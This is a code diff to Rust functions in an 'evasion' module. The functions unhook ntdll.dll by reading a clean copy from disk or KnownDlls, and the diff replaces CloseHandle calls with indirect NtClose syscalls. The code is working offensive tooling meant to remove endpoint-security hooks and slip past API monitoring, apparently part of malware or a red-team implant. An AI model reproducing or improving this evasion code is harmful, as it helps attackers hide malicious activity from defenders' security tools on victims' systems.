@@ -16,7 +16,7 @@ pub unsafe fn unhook_ntdll_disk() -> bool {
     use windows_sys::Win32::Storage::FileSystem::{
         CreateFileA, ReadFile, OPEN_EXISTING, FILE_SHARE_READ, FILE_ATTRIBUTE_NORMAL,
     };
-    use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, CloseHandle, GENERIC_READ};
+    use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, GENERIC_READ};
     use crate::evasion::syscalls::{get_ssn, indirect_syscall};
 
     let ntdll_base = resolve_ntdll_base();
@@ -32,7 +32,9 @@ pub unsafe fn unhook_ntdll_disk() -> bool {
     let mut buf = vec![0u8; 0x20_0000];
     let mut bytes_read: u32 = 0;
     ReadFile(h, buf.as_mut_ptr() as _, buf.len() as u32, &mut bytes_read, core::ptr::null_mut());
-    CloseHandle(h);
+    if let Some((ssn_c, tramp_c)) = get_ssn(b"NtClose") {
+        indirect_syscall(ssn_c, tramp_c, h as usize, 0, 0, 0, 0, 0);
+    }
 
     let disk_ntdll = buf.as_ptr();
     let (text_rva, text_size) = get_text_section(disk_ntdll);
@@ -78,8 +80,6 @@ pub(crate) unsafe fn get_text_section(base: *const u8) -> (usize, usize) {
 #[cfg(target_os = "windows")]
 pub unsafe fn unhook_ntdll_knowndlls() -> bool {
     use crate::evasion::syscalls::{get_ssn, indirect_syscall, indirect_syscall_10};
-    use windows_sys::Win32::Foundation::CloseHandle;
-
     let ntdll_base = resolve_ntdll_base();
     if ntdll_base.is_null() { return false; }
 
@@ -126,8 +126,11 @@ pub unsafe fn unhook_ntdll_knowndlls() -> bool {
     );
     if status != 0 || section_handle == 0 { return false; }
 
+    let nt_close_h = |h: usize| {
+        if let Some((sc, tc)) = get_ssn(b"NtClose") { indirect_syscall(sc, tc, h, 0, 0, 0, 0, 0); }
+    };
     let Some((map_ssn, map_tramp)) = get_ssn(b"NtMapViewOfSection") else {
-        CloseHandle(section_handle as _); return false;
+        nt_close_h(section_handle); return false;
     };
 
     let mut base_address: usize = 0;
@@ -141,7 +144,7 @@ pub unsafe fn unhook_ntdll_knowndlls() -> bool {
         2, 0, 0x02,
     );
     if map_status != 0 || base_address == 0 {
-        CloseHandle(section_handle as _); return false;
+        nt_close_h(section_handle); return false;
     }
 
     let mapped = base_address as *const u8;
@@ -167,6 +170,6 @@ pub unsafe fn unhook_ntdll_knowndlls() -> bool {
     if let Some((unmap_ssn, unmap_tramp)) = get_ssn(b"NtUnmapViewOfSection") {
         indirect_syscall(unmap_ssn, unmap_tramp, usize::MAX, base_address, 0, 0, 0, 0);
     }
-    CloseHandle(section_handle as _);
+    nt_close_h(section_handle);
     text_size > 0
 }
